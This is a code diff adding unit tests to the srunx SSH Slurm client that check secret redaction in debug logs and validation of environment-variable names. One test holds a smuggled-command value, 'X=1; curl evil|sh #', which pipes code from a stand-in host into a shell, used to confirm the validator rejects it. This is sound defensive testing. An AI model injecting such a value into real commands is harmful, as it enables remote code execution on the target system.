@@ -335,3 +335,26 @@ class TestCleanupJobFiles:
 
         client.slurm.cleanup_job_files(job)
         client.files.cleanup_file.assert_not_called()
+
+
+class TestEnvVarSecurity:
+    """Env-var key validation (#222) and debug-log redaction (#221)."""
+
+    def test_redact_exports_masks_values(self):
+        from srunx.ssh.core.slurm import _redact_exports
+
+        out = _redact_exports("export API_KEY='sk-secret' && sbatch job.sh")
+        assert "sk-secret" not in out
+        assert "export API_KEY='***'" in out
+
+    def test_env_key_regex_rejects_shell_metachars(self):
+        from srunx.ssh.core.slurm import _ENV_KEY_RE
+
+        assert _ENV_KEY_RE.fullmatch("API_KEY")
+        assert not _ENV_KEY_RE.fullmatch("X=1; curl evil|sh #")
+        assert not _ENV_KEY_RE.fullmatch("1BAD")
+
+    def test_get_slurm_env_setup_rejects_bad_key(self):
+        client = SSHSlurmClient(hostname="h", username="u", key_filename="k")
+        with pytest.raises(ValueError, match="Invalid environment variable name"):
+            client.slurm._get_slurm_env_setup({"BAD KEY": "v"})
